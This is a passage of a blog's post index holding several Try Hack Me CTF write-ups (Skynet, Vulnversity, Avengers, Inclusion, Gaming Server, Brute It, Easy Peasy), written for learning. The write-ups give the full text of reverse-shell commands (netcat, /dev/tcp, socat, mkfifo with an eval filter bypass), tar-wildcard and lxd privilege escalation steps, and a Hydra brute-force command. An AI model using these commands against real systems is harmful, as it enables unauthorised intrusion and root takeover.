share!SambaWithin notes, there was a long list of files (mostly PDF), but one file stood out. Downloading this file onto my system, it contained the following content:1. Add features to beta CMS /45kra24zxs28v3yd2. Work on T-800 Model 101 blueprints3. Spend more time with my wifeThere is a CMS available at that odd endpoint that we should check out!CMSThere isn’t much information present on this page or in the source. Gobuster could reveal some interesting endpoints hidden behind this CMS.Woot! An administrator endpoint to check out!A login portal to the administrative section of the Cuppa CMS (this may be an actual CMS product).I thought we could obtain access through the credentials that got us access to Squirrelmail or the Samba share. I tried various combinations of usernames (milesdyson, admin, administrator) and the passwords from the password list but nothing worked.Authenticating to the administrative section did not pan out so let’s see if there are any public exploits for the Cuppa CMS.So the Cuppa CMS is vulnerable to LFI and RFI! Looking into the details of the vulnerability, the alertConfigField.php file accepts a parameter, urlConfig, that causes it. Let’s try to access the /etc/passwd file.We’ve confirmed that this application is vulnerable to LFI. The application must be running as root since we couldn’t access the /etc/shadow file.I spent a bit of time wondering if this was a dead end as I did not know how to use LFI to obtain our initial foothold. The exploit indicated that the CMS is also vulnerable to RFI. I haven’t been exposed to RFI as much but while thinking about how it works, I wondered if the server could execute PHP code once it downloads it from our attacker system.Initial FootholdReading more about RFI on this article, they confirmed my assumption.Using msfvenom to generate a Meterpereter payload, I created a rev-shell.php file and served the file using Python’s http.server module.Next, we need to configure a Metasploit handler to send the second stage Meterpreter payload. With all of that configured, let’s send the RFI request in the browser and cross our fingers.We obtained a Meterpreter shell! In the browser address, we send the request for the rev-shell.php file which also shows up in the Python web server logs. On the right, the Metasploit handler sends the 2nd stage Meterpreter payload which opens up the Meterpreter session.Within the Meterpreter session, let’s browse to miledyson’s home directory for the user flag.User Flag: 7ce5c2109a40f958099283600a9ae807Privilege EscalationOne interesting thing that I noticed in milesdyson’s home directory is the backups folder. Within the directory which is world readable is a backups.sh and backup.tgz file.Looking at the timing of backup.tgz, the file has been updated very recently which means that there may be a cron job for this backup.From the contents of the /etc/crontab file, there is a cron task to run the backup.sh script every minute as root.Outputting the contents of the backup.sh file:#!/bin/bashcd /var/www/htmltar cf /home/milesdyson/backups/backup.tgz *The wildcard path for tar is vulnerable to a privilege escalation technique that’s documented very well in this article.The way this vulnerability works is that we need to create three files, two of which are named in the same format as command line parameters to tar, and one file being a reverse shell payload.The two command line parameters are --checkpoint=1 and --checkpoint-action=exec=sh &lt;filename&gt;. At every checkpoint, tar will exec the command provided and since root is running the backup script, the checkpoint-action script will be executed as root. Therefore, we can provide a reverse shell payload as the script to execute which will connect back to our netcat listener with a root shell.I’ll provide the exact steps in the Useful Commands section but the following image show the captured shell on port 5555 as root.We can grab the root flag!We have completed this room!Useful CommandsTar WildCard PrivescGenerate a reverse netcat payload using msfvenom.msfvenom -p cmd/unix/reverse_netcat LHOST=10.6.5.103 LPORT=5555Cop the generated payload and save it as shell.sh in the folder that the tar command is generating a tar file of.Create the two “files” that will act as the command line parameters for the tar command.echo \"\" &gt; \"--checkpoint-action=exec=sh shell.sh\"echo \"\" &gt; --checkpoint=1Set up a netcat listener on port 5555 and wait for the cron task to be done or execute the tar command yourself if SUID is enabled.ReflectionOf the category of easy rooms that I have completed on Try Hack Me so far, this probably falls on the higher end of the spectrum. This was definitely a challenging room with many vectors that could have led to rabbit holes.The previous few rooms I have completed so far have not been finished without some help from a hint on Try Hack Me. Learning from my prior roadblocks, I was determined to do as much due diligence as possible and explore each vector as much as possible without hints. The persistence worked off as I completed this room and learned along the way.I thoroughly enjoy the themed rooms on THM and this was no exception. There are a ton of opportunities to learn about tools and exploitation techniques including gobuster, hydra, smb, remote file inclusion, and tar privilege escalation." }, { "title": "Vulnversity (Try Hack Me)", "url": "/posts/thm-vulnversity/", "categories": "Cybersecurity, Writeups", "tags": "thm, ctf, writeup", "date": "2021-09-11 18:00:00 -0400", "snippet": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely commun...", "content": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely communicate the pentest lifecycle.EnumerationAs always, let’s perform an initial nmap scan of the top 1000 ports.There’s lots to digest but let’s take it step by step. There are several open ports: 21 (FTP) 22 (SSH) 139/445 (Samba) 3128 (Squid Proxy) 3333 (HTTP)The target is likely an Ubuntu Linux OS from the version information for SSH and HTTP services.The smb scripts against the Samba service reveal the OS (though Windows 6.1 is likely incorrect), Computer name, Domain name, FQDN, and more.Let’s use a methodical approach to enumerate and exploit these services.FTPThe first approach I take with FTP is to just try out anonymous authentication.Without a valid set of credentials and potentially vulnerable version of FTP, we’ll loop back to this if necessary.SambaFor SMB, my initial approach is similar to FTP to list the shares using smbclient unauthenticated.The shares ending with a $ may be default shares but there does not seem to be any shares with content for us to view.HTTPBrowsing to the index page of the web application,and we are presented with a beautiful landing page of “Vuln University”.Browsing the web application, there is no information leaked in the page source, no robots.txt file, or in the HTML content presented. Maybe directory enumeration will provide us a path to proceed with./internal does not look like it was meant for the users of the application. Let’s see where it leads us to!A form to upload files! This might be a vector to abuse the form and upload a reverse shell of ours. Before we do that, we need to figure out two things: The backend language used (PHP, Python, Java, etc) Where the files are uploadedForm UploadFor the first point, I used nikto and whatweb to try to determine the backend programming language but no luck. However, Wappalyzer (a Chrome extension to analyze web application technologies), revealed that it was PHP.Maybe Wappalyzer is guesstimating that it is PHP based on the other information but I could not determine it myself 1. No matter. We shall assume it is PHP for now and try to upload a reverse shell payload.Next, we’ll need to determine where the uploaded files end up. It may likely be hidden behind the /internal endpoint since it’s not meant to be exposed to the public.Great! With a /uploads folder, we have everything sorted out. Let’s try to upload Pentest Monkey’s reverse shell payload 2.Initial FootholdTrying to upload the file as rev.php failed with an error message saying the extension is not allowed. We could try other php extensions that could bypass this server side filter 3.There is only a few PHP extensions that we could manually modify the extension but let’s hone our Burpsuite skills to build this attack in Burp Intruder.Intercepting the upload file request and sending it off to Burp Intruder, we’ll clear all payload positions and add one around the extension name.Next, we’ll add our payload list and launch the attack.The .phtml extension is the only one with a different response length! We can set up a netcat listener, trigger the PHP code, and hopefully obtain a reverse shell if all of our assumptions about the backend language are correct.Success! We have obtained the reverse shell. The user flag is available at /home/bill/user.txt as a world-readable file and we can switch focus towards obtaining privilege escalation.User Flag: 8bd7992fbe8a6ad22a63361004cfcedbPrivilege EscalationWe aren’t able to check for sudo privileges for www-data since we’re prompted for a password. There were no interesting files for bill or www-data and many of my typical commands did not pan out.Next, I downloaded a Linux Privesc Enumeration Script (linpeas) from my attacker system and I could not find anything interesting.After spending some time, I checked out the hint on the room description and it mentioned systemctl, a misconfigured SUID binary (more details in Reflection).With the SUID bit set, this means we can execute this command without sudo but have sudo privileges.Let’s check if gtfobins has an entry for systemctl.Instead of reading a file, we’ll modify the ExecStart value to create a reverse shell connection on port 5555 of our attacker system. The service file looks as follows:[Unit]Description=Generate Root Shell[Service]ExecStart=/bin/bash -c \"/bin/bash -l &gt; /dev/tcp/10.6.5.103/5555 0&lt;&amp;1 2&gt;&amp;1\"[Install]WantedBy=multi-user.targetOnce we set up our netcat listener on port 5555, we can link, enable, and start the service file as indicated in the gtfobins image, and we’ll have our reverse shell!There we go! We could upgrade the shell if we want to, but let’s just get the root flag completing this room.Root Flag: a58ff8579f0a9270368d33a9966c7fd5ReflectionOnce again, I made the mistake of not being patient and enumerating the target properly. I reacted quickly and viewed the hint even though I ran the exact command needed to find the systemctl binary.References https://www.quora.com/Is-there-any-way-to-find-out-the-programming-language-used-in-the-website &#8617; https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php &#8617; https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass &#8617; " }, { "title": "Avengers (Try Hack Me)", "url": "/posts/thm-avengers/", "categories": "Cybersecurity, Writeups", "tags": "thm, ctf, writeup", "date": "2021-09-11 18:00:00 -0400", "snippet": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely commun...", "content": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely communicate the pentest lifecycle.EnumerationWhy don’t we kick things off with one of our standard nmap scans.This command performs an initial scan of the top 1000 ports of the target. There are 3 open ports: 21 (FTP) 22 (SSH) 80 (HTTP)From the version information of the SSH service, this target is an Ubuntu Linux OS.FTPI like to approach the FTP service first to test for anonymous authentication but we are out of luck for this room.No matter! Let’s check out the HTTP service.HTTPThe web application is a blog of the Avengers where the members of the Avengers have posted about random things?Scrolling to the bottom of the web page, Rocket submitted an entry potentially revealing Groot’s password.I tried the credentials groot:iamgroot on the SSH service but that service only allows SSH keys to authenticate as users. Next, I tried the credentials on the FTP server and the only file present was a file that contained a flag to one of the questions for this room on Try Hack Me.With not much to go off of here, let’s perform some directory enumeration.The /portal is an interesting endpoint as /logout redirects us to it.It’s an authentication page! These intentionally vulnerable rooms occasionally contain leaked credentials so let’s check out the page source.Interesting! This authentication page may be susceptible to SQL injection.SQLiI will address more in my reflection of this room but I viewed the hint in the Try Hack Me room to solve the SQLi.Once we bypassed the login, we are presented with a “Jarvis” portal that can execute commands for us.Initial FootholdRemote Command ExecutionTrying out some sample commands, the target is processing the commands through a sh/bash interpreter.The first thing I like to do with potential RCE is to see if I can ping my attacker machine. I start by capturing the traffic on that tun interface filtering for ICMP requests. Next, I run the command to ping the IP address on that interface for a count of 3.Fantastic! Since we have outgoing connectivity, let’s try to obtain a reverse shell.While enumerating this webshell, the Node backend was blocking some commands stating them as not allowed. It took LOTS of trial and error to understand the functionality of the application.I used pstree -a to understand how the Node backend was processing our input and executing it.All of our input is being executed by the Shell with the -c flag which executes a single command. This was not as helpful with my limited knowledge of how to abuse this but it may come in handy in the future.We couldn’t just use netcat or bash to generate a reverse shell as a significant number of commands returned “Command disallowed”. On top of that, for any commands that generated an error, the application returned “Command not found”.It took a while but what clicked was that the application was just searching for the disallowed commands in the string. If “cat” was banned but netcat was not, netcat would still be banned since the word cat was in there.I spent a few hours at this stage trying various techniques and methods trying to bypass those commands. Halfway through, I looked at a few writeups but they used the hint provided to read the final flag using the rev command as that bypasses the banned tail,cat,more,etc commands. I was determined to generate the reverse shell so I persevered.I came up with two methods to bypass this command filtering. For the first method, I base64’d the command that was being blocked and wrapping it with a $() to execute the string. The second method utilized the same wrapping but translated the command from all uppercase characters (the server did not check both uppercase and lowercase commands) to lowercase characters. I tested both situations on my system but it failed with any commands that used redirects and pipes.A bit of google-fu and there was an alternative to use the eval command to execute a string. Instead of wrapping the command with $(), I used one of the two methods I came up with and evaluated it as a string. It took several hours trying out various techniques to bypass the command filtering and figure out which reverse shell payload would work but I hit the jackpot with the following command!` eval “$(echo “RM /TMP/F;MKFIFO /TMP/F; CAT /TMP/F | /BIN/SH -I 2&gt;&amp;1 | NC 10.6.5.103 80 &gt; /TMP/F” | tr ‘[A-Z]’ ‘[a-z]’)”`A quick breakdown of the command that worked for me: The reverse shell payload is from the PayloadAllTheThings repository. The payload is translated from uppercase to lowercase The \"$()\" executes the translation and saves it as a string eval executes the string command generating the reverse shellSuccess! We obtained a shell as root. We were rewarded greatly with the fruits of our labour! We can now grab the final flag and consider this room completed.ReflectionThis room was challenging for a variety of reasons. I gave up during the SQL injection portion fairly quickly. For the final aspect generating the reverse shell, it would have been easy to read the final flag with the techniques that I had and move on. After giving up quickly on the SQLi, I was determined to solve the challenge.SQLi is not one of my favourite challenges to solve but that is not an excuse to learn or strive to better at that aspect. There’s an abundance of resources on learning and improving at it instead of just trying one type of payload and then throwing sqlmap at it and praying.I have ways to go to “Try Harder” and be relentless in my persistence. I won’t progress far if I give up on a roadblock within the first few minutes." }, { "title": "Inclusion (Try Hack Me)", "url": "/posts/thm-inclusion/", "categories": "Cybersecurity, Writeups", "tags": "thm, ctf, writeup", "date": "2021-09-11 15:45:00 -0400", "snippet": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely commun...", "content": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely communicate the pentest lifecycle.EnumerationKicking things off with an initial nmap scan of the top 1000 ports, there are two available ports: 22 (SSH) 80 (HTTP)I haven’t had much experience interacting with a web application hosted by Python so this will be interesting.From the version information for the SSH, the target is an Ubuntu Linux OS.HTTPBrowsing to the web application hosted on port 80, we’re presented with a Bootstrap styled landing page.There are not many available sections of the website other than the three columns in the grid at the bottom of the page. Clicking on any of the “View details” options directs us to /article along with a parameter for the name of the article.SO, it is pretty obvious from the name of the room, the title of the article, and the contents of the article that this room is focused on Local File Inclusion (LFI).Initial FootholdLocal File InclusionThe first file we can try to access is the /etc/passwd file as it is world readable. We can get an idea of the various users available on the system so we could brute force the SSH service.If the web application is running as root, then we might also be able to view the /etc/shadow file and then use John the Ripper to brute force the root hash or other non-root user hashes.LFI takes a bit of trial and error as we need to find where the web application is being served from. Usually, the web applications files begin at /var/www/html so if we move up three levels in the directory structure, we’ll be at the root of the filesystem.We were correct! So we have access to the /etc/passwd contents but this is a jumbled mess! If we view the page source, we should have a structured response.Fantastic! However, it looks like the password for one of the users is leaked in the passwd file as a comment! Looks like we won’t have to do any potential brute force cracking using John the Ripper.With the SSH service open, we obtained our initial foothold as the user falconfeast.Grabbing the user flag and we can perform some privilege escalation.User Flag: 60989655118397345799Privilege EscalationLet’s list out the privileges of the falconfeast user!The user, falconfeast, can execute socat as root with no required password. Socat is a similar program to netcat where we can generate a reverse shell to our attacker system 1.Woot! We obtained root and we can complete the room with the root flag.Root Flag: 42964104845495153909ReflectionThis room was meant more as an educational role rather than a semi-challenging LFI room. The killchain to obtaining root took a minimal number of steps but this room provided the opportunity to learn about LFI and using socat to generate a reverse shell.Useful CommandsSocat Reverse Shellsocat tcp-connect:10.6.5.103:4444 exec:/bin/sh,pty,stderr,setsid,sigint,saneReferences https://gtfobins.github.io/gtfobins/socat/#reverse-shell &#8617; " }, { "title": "Gaming Server (Try Hack Me)", "url": "/posts/thm-gaming-server/", "categories": "Cybersecurity, Writeups", "tags": "thm, ctf, writeup", "date": "2021-09-11 10:45:00 -0400", "snippet": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely commun...", "content": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely communicate the pentest lifecycle.EnumerationThe initial nmap scan of the top 1000 ports of the target reveals two open ports: 22 (SSH) 80 (HTTP)The target is an Ubuntu Linux OS as indicated in the SSH and Apache version information.Unlike the past few rooms that we have completed, the Apache server does not have the default title upon installation so let’s check that out first.HTTPThe content of the web application looks something out of Game of Thrones! Before we browse other sections of the application, let’s perform some directory enumeration using gobuster!I trimmed the output of the gobuster results as most of the results .ht* files that we do not have access to. The command I used to obtain these results is:gobuster dir -u 10.10.148.18 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x \"php,txt,html,old,bak\" -t 25A robots.txt file! This wasn’t in the nmap results but it may contain more endpoints that we were not exposed to from the gobuster results.user-agent: *Allow: //uploads/Hmm, we have already encountered that in the gobuster results but it must be important. With an uploads directory, there may be a vector to upload a reverse shell payload (possibly /secret?) and trigger the connection from the uploads directory.Before we switch focus to the /secret and /uploads directories, let’s explore the application a bit and check for any information leaked in the content or in the page source.Only the index.html source leaked some information about a potential name/username.This may be handy afterwards!Initial FootholdWe can finally switch focus to the two interesting directories from the gobuster results. Viewing the /secret directory:This Apache server provides an indexed view for the /secret directory. Viewing the contents of secretKey, it is an SSH private key that is encrypted by a passphrase.-----BEGIN RSA PRIVATE KEY-----Proc-Type: 4,ENCRYPTEDDEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phxH4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSMFznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kSLafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv89zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIOIrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNNSkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wtw7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3uZmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPlxhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i68BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAiib79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcnvzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkLwTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fGrtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YWRTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTkcQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eqEzf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+QQu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2hv3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipstgbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P-----END RSA PRIVATE KEY-----Before we use John the Ripper and the rockyou wordlist to crack this, we should check if /uploads provides a similar indexed view to /secret.It does! Of the three files, the dict.lst file may contain one of the passphrases for the SSH private key. A quick glance at the other two files did not provide any interesting information. We can ignore those for now and come back to them later if needed.With the three pieces of information: username: john private key protected by passphrase: secretKey dictionary: dict.lstThis should be enough to obtain our initial foothold into the target.Let’s use ssh2john.py to convert the SSH private key into a crackable file by John the Ripper. Next, we’ll use JTR with the dict.lst wordlist and see if it can be cracked.Awesome! I bet letmein was in the rockyou wordlist anyways but a more complicated password in the dict.lst file would’ve rendered that point moot.We have our initial foothold into the system as john and let’s grab the user flag.User Flag: a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7ePrivilege EscalationListing the sudo privileges of john is a dead end as it requests the password which we do not have.I tried a few other things: Searching for files owned by user John or group John Searching for any misconfigured SUID binaries World readable/writable /etc/shadow and /etc/passwd filesNone of these vectors returned anything. As I was about to grab the linpeas enumeration script, I checked the groups for john to see if there was anything out of the ordinary.The group lxd stood out to me. Performing some google-fu for “lxd group privesc” and one of the top hits was an article by hackingarticles on how to abuse this 1.The abuse of the lxd privileges is WAY beyond my technical knowledge but I will try to summarize the steps very briefly here. The article does a fantastic job of that anyways.A member of the “lxd” group can escalate their privileges to root even if the user does not have sudo privileges. The user can create a container mounting the root file system (/) into the container and enter the container as the root user.The steps to configure the abuse as well as exploit are documented in the article. The article mounts the root filesystem to /mnt/root in the container. Once we enter the container, the user will be root and we can find the flag at /mnt/root/root/root.txt.And there we go! We have completed this room!Root Flag: 2e337b8c9f3aff0c2b3e8d4e6a7c88fcReflectionThe lxd group being the way to privilge escalation stood out from prior experience of completing this room. I had never encountered this before so the first time I completed this room, I took a quick peek at a walkthrough to know that lxd was the vector for privesc.This doesn’t fall into the standard privilege escalation vectors that a majority of the Easy THM rooms utilize but I love coming across new ones. Recognizing the needle in the haystack comes with experience as you build a mental understanding of what is normal and not normal.In the end, I enjoyed learning something new and not that it is documented, I hope I won’t forget it.Useful Commandslxd privilege escalation Build the alpine image on attacker system$ git clone https://github.com/saghul/lxd-alpine-builder.git$ cd lxd-alpine-builder$ ./build-alpine Transfer the generated tar file to the target Use the following commands to import the image, mount the file system, and enter the container $ lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage$ lxc init myimage ignite -c security.privileged=true$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true$ lxc start ignite$ lxc exec ignite /bin/shReferences https://www.hackingarticles.in/lxd-privilege-escalation/ &#8617; " }, { "title": "Brute It (Try Hack Me)", "url": "/posts/thm-bruteit/", "categories": "Cybersecurity, Writeups", "tags": "thm, ctf, writeup", "date": "2021-09-10 19:30:00 -0400", "snippet": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely commun...", "content": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely communicate the pentest lifecycle.EnumerationAn initial nmap scan of the top 1000 ports of the target reveals two open ports: 22 (SSH) 80 (HTTP)The target is an Ubuntu Linux OS as indicated by the version information for the SSH and Apache services.HTTPAs indicated by the http-title details in the nmap results, the title for the web application hosted by Apache is the default title.Browsing to the web application, there is no information visible on the default Apache page, no leaked information in the page source, and no robots.txt file. With no information to progress off of, we shall proceed to directory enumeration.The /admin endpoint is the only interesting result in the gobuster scan so let’s browse to that!Checking out the page source…The system administrator left a vital piece of information for us to take advantage of (as if anyone would forget the username admin). This may have been the logical approach but since the room is called “bruteit”, let’s brute force the login as admin.First, we need to intercept the request to analyze how the payload is structured. This could be in the browser Developer Tools but I like to practice with Burpsuite.Turning on the intercept and browser proxy, we captured the request. The request contains two fields, user and pass. We could use Burpsuite’s Intruder feature to brute force the request but the free version has an obscene throttling rate so let’s use Hydra.If we use Hydra, we need to know what an invalid authentication attempt looks like.That string, “Username or password invalid”, is important for our success with Hydra. Hydra’s http-post-form module expects at least 3 parameters 1: POST endpoint POST payload Failure stringThe last parameter could be other values other than a failure string but failure is the default. Let’s construct the hydra command but I will break the command down in the Useful Commands section closer to the bottom of this post.Success! Looks like the password for the admin user, xavier was present in the rockyou wordlist. Authenticating as admin, we are redirected to /panel.We now have our initial foothold into the target.Initial FootholdLet’s download the private key.-----BEGIN RSA PRIVATE KEY-----Proc-Type: 4,ENCRYPTEDDEK-Info: AES-128-CBC,E32C44CDC29375458A02E94F94B280EAJCPsentybdCSx8QMOcWKnIAsnIRETjZjz6ALJkX3nKSI4t40y8WfWfkBiDqvxLImUrFu3+/UCmXwceW6uJ7Z5CpqMFpUQN8oGUxcmOdPA88bpEBmUH/vD2K/Z+Kg0vY0BvbTz3VEcpXJygto9WRg3M9XSVsmsxpaAEl4XBN8EmlKAkR+FLj21qbzPzN8Y7bKHYQ0L43jIulNKOEq9jbI8O1c5YUwowtVlPBNSlzRMuEhceJ1bYDWyUQk3zpVLaXy+Z3mZtMq5NkAjidlol1ZtwMxvwDy478DjxNQZ7eR/coQmq2jj3tBeKH9AXOZlDQwUHfmEmBwXHNK82Tp/2eW/Sk8psLngEsvAVPLexeS5QArs+wGPZp1cpV1iSc3AnVBVOxaB4uzzTXUjP2H8Z68a34B8tMdej0MLHC1KUcWqgyi/Mdq6l8HeolBMUbcFzqAvbVm8+6DhZPvc4F00bzlDvW23b2pI4RraI8fnEXHty6rfkJuHNVR+N8ZdaYZBODd/n0a0fTQ1N361KFGr5EF7LX4qKJz2cP2m7qxSPmtZAgzGavUR1JDvCXzyjbPecWRy0cuCmp8BC+Pd4s3y3b6tqNuharJfZSZ6B0eN99926J5ne7G1BmyPvPj7wb5KuW1yKGn32DL/Bn+a4oReWngHMLDo/4xmxeJrpmtovwmJOXo5o+UeEU3ywr+sUBJc3W8oUOXNfQwjdNXMkgVspf8w7bGecucFdmI0sDiYGNk5uvmwUjukfVLT9JPMN8hOns7onw+9H+FYFUbEeWOu7QpqGRTZYoKJrXSrzII3YFmxE9u3UHLOqqDUIsHjHccmnqxzRDSfkBkA6ItIqx55+cE0f0sdofXtvzvCRWBa5GFaBtNJhF940Lx9xfbdwOEZzBDwYZvFv3c1VePTT0wvWybvo0qJTfauB1yRGM1l7ocB2wiHgZBTxPVDjb4qfVT8FNPf17Dz/BjRDUIKoMu7gTifpnB+iw449cW2y538U+OmOqJE5myq+U0IkY9yydgDB6uuGrfkAYp6NDvPF71PgiAhcrzggGuDq2jizoeH1Oq9yvt4pn3Q8d8EvuCs32464l5O+2w+T2AeiPl74+xzkhGa1EcPJavpjogio0E5VAEavh6Yea/riHOHeMiQdQlM+tNC6YOrVDEUicDGZGVoRROZ2gDbjh6xEZexqKc9Dmt9JbJfYobBG702VC7EpxiHGeJmJZ/cDXFDhJ1lBnkF8qhmTQtziEoEyB3D8yiUvW8xRaZGlOQnZWikyKGtJRIrGZvOcD6BKQSzYoo36vNPK4U7QAVLRyNDHyeYTo8LzNsx0aDbu1rUC+83DyJwUIxOCmd6WPCj80p/mnnjcF42wwgOVtXduekQBXZ5KpwvmXjb+yoyPCgJbiVwwUtmgZcUN8BzQ8oFwPXTszUYgNjg5RFgj/MBYTraL6VYDAepn4YowdaAlv3M8ICRKQ3GbQEV6ZCmiDKAMx3K3VJpsY4aV52au5x43do6e3xyTSR7E2bfsUblzj2b+mZXrmxst+XDU6ux1a9TrlunTcJJZJWKrMTEL4LRWPwR0tsb25tOuUr6DP/Hr52MLaLg1yIGR81cR+W-----END RSA PRIVATE KEY-----Hmm. This probably was not as easy as I thought. The private key is protected by a passphrase.No matter. There is an incredibly useful series of scripts that convert encrypted files to a hash that John the Ripper can understand and crack. These scripts are of the form &lt;service&gt;2john. To crack the private key passphrase, we shall use ssh2john.The command structure is also incredibly simple, ssh2john.py id_rsa &gt; filename.Phew, JTR will crack that SSH encrypted key very quickly.Now, we have definitely obtained our initial foothold. Let’s grab the user flag and move on to privilege escalation. The user flag is available at /home/john/user.txt.User Flag: THM{a_password_is_not_a_barrier}Privilege EscalationWe’ll begin by listing out the sudo privileges of the user.Okay! Looks like we can use /bin/cat as root with no password which is great since we don’t have a password to begin with.We could read the contents of the root.txt file which is likely located in the root user’s directory but we could use this as an opportunity to try to crack the root user’s password.We can save the contents of the /etc/passwd and /etc/shadow file to our attacker machine, use the unshadow command to combine them into a single file and use JTR to crack the hashes.Woot woot! John found the password for the root user in the rockyou.txt file. Let’s switch as root and grab the root flag.Root Flag: THM{pr1v1l3g3_3sc4l4t10n}And with that, we have completed the room.Useful CommandsHydra Posthydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.150.210 http-post-form \"/admin/:user=admin&amp;pass=^PASS^:Username or password invalid\" -l admin: User the username admin -P rockyou.txt: User the password list provided 10.10.150.210: target to use http-post-form: Hydra module to use (parameters for the module are separate by colons) \"/admin/\": POST endpoint \"user=admin&amp;pass=^PASS^\": The POST payload data. In this case, user and pass are the fields the serve expects. We’re hardcoding admin as the username and ^PASS^ is the expected Hydra placeholder for the password from the password list Username or password invalid: The failure condition string that Hydra searches for in the resopnse ReflectionThe first time I completed this room, I think I followed the Try Hack Me questions order which gives a strong pathway to solving this room. At that time, I don’t think I would have tried to crack the root user’s password and would have just grabbed the file instead.In this journey to create a writeup and document it on this website, I am not using the questions to guide me to solving this room. With experience, this room is definitely on the easier end but it provides a lot of experience with brute forcing authentication and cracking various sorts of hashes.References https://infinitelogins.com/2020/02/22/how-to-brute-force-websites-using-hydra/ &#8617; " }, { "title": "Easy Peasy CTF (Try Hack Me)", "url": "/posts/thm-ezpz-ctf/", "categories": "Cybersecurity, Writeups", "tags": "thm, ctf, writeup", "date": "2021-09-09 21:30:00 -0400", "snippet": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely commun...", "content": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely communicate the pentest lifecycle.EnumerationIt’s time to perform some enumeration!The initial nmap scan for the top 1000 ports shows that only port 80 is open. The target is hosting an nginx server (version 1.16.1) but there is not too much information available even about the OS version.If we can’t obtain much information from the web application, we may have to perform a nmap scan of all 65,535 ports. But let’s not discredit the web application yet!HTTPBrowsing to the IP address of the target, we come across what looks like a default successful installation page of nginx.The nmap results did indicate that there was a robots.txt file.User-Agent:*Disallow:/Robots Not AllowedLooks like the system administrator was being a little cheeky with the comment at the end.With no leaked information in the page source either, let’s move on to some directory brute forcing using my favorite tool, gobuster!Ouuu, a hidden endpoint!That spooked me a little bit. Seems like some radiation zone but there’s no real information present in this image nor in the page source. However, we can continue to dig deeper with gobuster on the /hidden directory.Another endpoint to visit!This is a much friendlier image! Once again, nothing to see here. Even the title says that this is a dead end. The page source does contain a hidden paragraph tag with what looks like base64 encoded data.Decoding the base64 encoded string$ echo ZmxhZ3tmMXJzN19mbDRnfQ== | base64 